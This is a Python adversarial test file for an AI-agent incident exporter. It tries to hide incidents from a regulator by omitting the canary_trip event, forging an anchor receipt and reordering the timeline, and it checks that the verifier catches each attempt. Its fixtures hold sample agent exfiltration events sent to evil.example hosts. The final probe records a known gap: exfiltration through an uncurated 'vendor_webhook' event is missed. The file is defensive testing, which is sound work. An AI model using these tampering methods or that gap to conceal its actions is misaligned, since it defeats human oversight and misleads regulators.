"""Adversarial battery for the incident exporter (gov/incident_export.py).

Attack model: a malicious or negligent operator (or a compromised export
pipeline) tries to ship a regulator-shaped incident report that hides the
incident. The verifier (verify_incident) must hold on all four required
attacks; the fifth probe measures the honest ceiling of the causal-
curation heuristic and is EXPECTED to break (narrative shaping through
non-curated event types is a documented limitation, not a product gap).

Run:  env -u GOV_DEPLOYMENT_MODE TMPDIR=$(mktemp -d) \
        ~/workspace/.gov-venv/bin/python evals/incident_export_adversarial.py
Exit 0 iff every HELD attack holds and the ceiling probe reports its
expected BREAK honestly.
"""
import os

os.environ.setdefault("GOV_DEPLOYMENT_MODE", "staging")

import hashlib
import json
import shutil
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(
    __file__))))

from gov.log import ActionLog
from gov.signing import Ed25519Signer
from gov.anchor_adapter import FakeLogAdapter
from gov import incident_export as ie
from tests.keyfixture import provision_test_key

provision_test_key()

TMP = tempfile.mkdtemp(prefix="incadv_")


def build_log(name, events):
    # Each attack gets its own directory: gov/log.py keeps its
    # tail-truncation checkpoint sidecar (checkpoints.jsonl) next to the
    # log, so sharing one directory across logs would cross-contaminate
    # the sidecar and fail verification closed.
    d = os.path.join(TMP, name)
    os.makedirs(d, exist_ok=True)
    signer = Ed25519Signer(hashlib.sha256(name.encode()).digest())
    logp = os.path.join(d, name + ".jsonl")
    log = ActionLog(logp, signer=signer)
    for ev in events:
        log.append(ev)
    return logp, signer


def export(logp, signer, run_id, out_name, **kw):
    adapter = FakeLogAdapter(hashlib.sha256(
        (out_name + "-anchor").encode()).digest())
    out = os.path.join(TMP, out_name, "incident")
    os.makedirs(out, exist_ok=True)
    kw.setdefault("entry_signer_pubkey", signer.public_key)
    ie.export_incident(logp, out, adapter, run_id=run_id, **kw)
    return out, adapter


def verify(out, logp, signer, adapter):
    ok, findings = ie.verify_incident(
        out, logp, entry_signer_pubkey=signer.public_key,
        anchor_pubkey=adapter.public_key)
    bad = [f["check"] for f in findings if not f["ok"]]
    return ok, bad, findings


def refix_digest(out):
    d = ie._transport_digest(out)
    with open(os.path.join(out, "INCIDENT_DIGEST.sha256"), "w",
              encoding="utf-8") as f:
        f.write(d + "\n")


def base_events(run_id="R1"):
    return [
        {"event": "policy_loaded", "policy_version": "v41",
         "policy_digest": "abc123"},
        {"event": "identity_minted", "agent_id": "a1", "role": "sender",
         "principal": "acme", "run_id": run_id},
        {"event": "agent_spawn", "agent_id": "a1", "run_id": run_id},
        {"event": "approval_decision", "approval_id": "ap1",
         "agent_id": "a1", "run_id": run_id, "decision": "allow",
         "tool": "send_email"},
        {"event": "tool_call", "agent_id": "a1", "run_id": run_id,
         "tool": "send_email", "decision": "allow", "approval_id": "ap1",
         "args": {"to": "attacker@evil.example", "body": "exfil data"}},
        {"event": "canary_trip", "agent_id": "a1", "run_id": run_id,
         "canary_id": "c9", "tool": "send_email"},
        {"event": "memory_quarantine", "agent_id": "a1", "run_id": run_id,
         "reason": "canary"},
        {"event": "decision_refused", "agent_id": "a1", "run_id": run_id,
         "tool": "send_email"},
    ]


def read_jsonl(path):
    with open(path, encoding="utf-8") as f:
        return [l for l in f.read().splitlines() if l.strip()]


def write_jsonl(path, lines):
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")


RESULTS = []


def attack(name, fn):
    try:
        held, detail = fn()
    except Exception as e:  # fail-closed: battery errors are loud
        held, detail = False, "battery error: %r" % (e,)
    RESULTS.append({"attack": name, "held": bool(held), "detail": detail})
    print("%-42s %s  %s" % (name, "HELD" if held else "BREAK", detail))


# ---------------------------------------------------------------- A1: omit
def a1_omit_incriminating_event():
    logp, signer = build_log("a1", base_events())
    out, adapter = export(logp, signer, "R1", "a1")
    tl = os.path.join(out, "timeline.jsonl")
    lines = read_jsonl(tl)
    kept = [l for l in lines if json.loads(l)["event"] != "canary_trip"]
    assert len(kept) < len(lines)
    write_jsonl(tl, kept)
    refix_digest(out)
    ok, bad, _fs = verify(out, logp, signer, adapter)
    held = (not ok) and any(c in ("I1", "I3", "C1", "C2", "A1")
                            for c in bad)
    return held, "omitted canary_trip -> verifier flags %s" % (bad,)


# ------------------------------------------------- A2: forge attestation
def a2_forge_completeness_attestation():
    logp, signer = build_log("a2", base_events())
    out, adapter = export(logp, signer, "R1", "a2")
    # The attacker writes a plausible-looking but self-issued
    # completeness claim: a receipt for a doctored statement on their
    # own anchor key.
    evil = FakeLogAdapter(hashlib.sha256(b"a2-evil").digest())
    forged = evil.anchor({
        "incident_id": "inc-forged",
        "window": {"from_seq": 2, "to_seq": 8},
        "run_id": "R1",
        "timeline_digest": "00" * 32,
        "causal_chain_digest": "11" * 32,
        "incident_digest": "22" * 32,
        "redaction_digest": "33" * 32,
    })
    with open(os.path.join(out, "anchor_receipt.json"), "w",
              encoding="utf-8") as f:
        json.dump(forged, f)
    refix_digest(out)
    ok, bad, _fs = verify(out, logp, signer, adapter)
    held = (not ok) and "A1" in bad
    return held, "self-issued receipt -> verifier flags %s" % (bad,)


# ------------------------------------------------- A3: nonexistent run
def a3_export_nonexistent_run():
    logp, signer = build_log("a3", base_events())
    adapter = FakeLogAdapter(hashlib.sha256(b"a3-anchor").digest())
    try:
        ie.export_incident(logp, os.path.join(TMP, "a3"), adapter,
                           run_id="RUN-THAT-NEVER-HAPPENED",
                           entry_signer_pubkey=signer.public_key)
    except ie.IncidentExportError as e:
        return True, "export refused: %s" % (e,)
    return False, "export SUCCEEDED for a run with zero entries"


# ------------------------------------------------- A4: reorder timeline
def a4_reorder_timeline():
    logp, signer = build_log("a4", base_events())
    out, adapter = export(logp, signer, "R1", "a4")
    tl = os.path.join(out, "timeline.jsonl")
    lines = read_jsonl(tl)
    # Put the containment BEFORE the trigger: a reordered narrative
    # where the refusal appears to precede the canary trip.
    lines[3], lines[6] = lines[6], lines[3]
    write_jsonl(tl, lines)
    refix_digest(out)
    ok, bad, _fs = verify(out, logp, signer, adapter)
    held = (not ok) and any(c in ("I1", "I2", "C1", "A1") for c in bad)
    return held, "swapped trigger/containment -> verifier flags %s" % (bad,)


# ----------------------- P5: honest ceiling — narrative shaping (EXPECT BREAK)
def p5_narrative_shaping_ceiling():
    """The curation heuristic only selects KNOWN event types. An
    adversary who exfiltrates through a custom/uncurated event type
    (here: 'vendor_webhook' carrying the exfil, with no canary firing)
    gets a timeline whose causal chain misses the real mechanism.
    The trigger is operator-declared; the chain contains the declared
    trigger but the exfil event itself is not curated as ancestry.
    EXPECTED: BREAK (documented ceiling)."""
    evs = [
        {"event": "policy_loaded", "policy_version": "v41"},
        {"event": "identity_minted", "agent_id": "a1", "run_id": "R9"},
        {"event": "agent_spawn", "agent_id": "a1", "run_id": "R9"},
        {"event": "vendor_webhook", "agent_id": "a1", "run_id": "R9",
         "args": {"url": "https://evil.example/x",
                  "payload": "customer PII"}},
        {"event": "tool_call", "agent_id": "a1", "run_id": "R9",
         "tool": "http_post", "decision": "allow",
         "args": {"url": "https://evil.example/x"}},
    ]
    logp, signer = build_log("p5", evs)
    out, adapter = export(logp, signer, "R9", "p5",
                          incident_class="operator_declared",
                          trigger_seq=5,
                          narrative="operator-declared exfil via webhook")
    inc = json.load(open(os.path.join(out, "incident.json")))
    chain_events = [c["event"] for c in inc["causal_chain"]]
    # The ceiling: the actual exfil mechanism (vendor_webhook) is not in
    # the curated causal chain even though it is in the timeline.
    missed = "vendor_webhook" not in chain_events
    ok, bad, _fs = verify(out, logp, signer, adapter)
    detail = ("chain=%s; verifier=%s (artifact is internally consistent; "
              "the MISS is the documented curation ceiling)" %
              (chain_events, "OK" if ok else bad))
    # "held" here means: the probe behaved as documented (miss observed).
    return missed, detail


def main():
    print("incident_export adversarial battery — %s" % TMP)
    attack("A1 omit incriminating event", a1_omit_incriminating_event)
    attack("A2 forge completeness attestation",
           a2_forge_completeness_attestation)
    attack("A3 export nonexistent run", a3_export_nonexistent_run)
    attack("A4 reorder timeline", a4_reorder_timeline)
    attack("P5 narrative-shaping ceiling (expect miss)",
           p5_narrative_shaping_ceiling)
    held = [r for r in RESULTS[:4] if r["held"]]
    ceiling = RESULTS[4]
    print("\nrequired attacks: %d/4 HELD" % len(held))
    print("ceiling probe: miss observed = %s (expected True)" %
          ceiling["held"])
    ok = len(held) == 4 and ceiling["held"] is True
    shutil.rmtree(TMP, ignore_errors=True)
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
